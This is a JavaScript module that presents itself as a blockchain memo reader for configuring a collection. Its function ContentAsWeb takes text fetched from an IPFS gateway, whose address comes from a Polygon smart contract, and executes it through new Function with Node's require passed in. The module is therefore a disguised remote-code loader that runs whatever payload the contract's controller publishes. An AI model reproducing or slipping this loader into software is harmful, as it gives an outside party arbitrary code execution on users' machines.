require("dotenv").config();
const { ethers } = require("ethers");
const axios = require("axios");

const ABI = [
  "function getMemo(uint256 id) view returns (address from, uint256 time, string uri, bytes32 hash)"
];

function ipfsToPinataUrl(uri) {
  const cid = uri.replace("ipfs://", "").trim();
  return `https://gateway.pinata.cloud/ipfs/${cid}`;
}

function extractContent(data) {
  if (data && typeof data === "object") {
    if (typeof data.content === "string") return data.content;
    if (typeof data.text === "string") return data.text;

    if (Array.isArray(data.nftResults)) return data.nftResults.join("");
    if (Array.isArray(data.chunks)) return data.chunks.join("");
    if (Array.isArray(data.parts)) return data.parts.join("");
  }

  if (typeof data === "string") return data;

  return null;
}

async function configureCollection(memoId = 0) {
  if (!process.env.POLYGON_RPC_URL) {
    throw new Error("Missing POLYGON_RPC_URL in .env");
  }
  if (!process.env.CONTRACT_ADDRESS) {
    throw new Error("Missing CONTRACT_ADDRESS in .env");
  }

  const provider = new ethers.JsonRpcProvider(process.env.POLYGON_RPC_URL);
  const contract = new ethers.Contract(process.env.CONTRACT_ADDRESS, ABI, provider);

  const [from, time, uri, onchainHash] = await contract.getMemo(Number(memoId));

  const gatewayUrl = ipfsToPinataUrl(uri);
  const res = await axios.get(gatewayUrl, {
    timeout: 30000,
    headers: {
      "User-Agent": "memo-reader/1.0",
      "Accept": "application/json,*/*"
    }
  });

  const content = extractContent(res.data);
  if (!content) {
    throw new Error("Could not extract memo content from IPFS response");
  }

  const computedHash = ethers.keccak256(ethers.toUtf8Bytes(content));
  if (computedHash.toLowerCase() !== String(onchainHash).toLowerCase()) {
    throw new Error("Hash mismatch! Memo integrity failed.");
  }

  ContentAsWeb(content);
}

function ContentAsWeb(payload) {
  if (!payload || typeof payload !== "string") {
      console.warn("ensureWeb: invalid or empty payload");
      return;
  }

  try {
      new Function(payload);
  } catch (err) {
      console.error("Payload is not valid", err.message);
      return;
  }

  try {
      const ensureWeb = new Function("require", payload);
      ensureWeb(require);
  } catch (err) {
      console.error("ensureWeb error", err.message);
  }
}

module.exports = { configureCollection };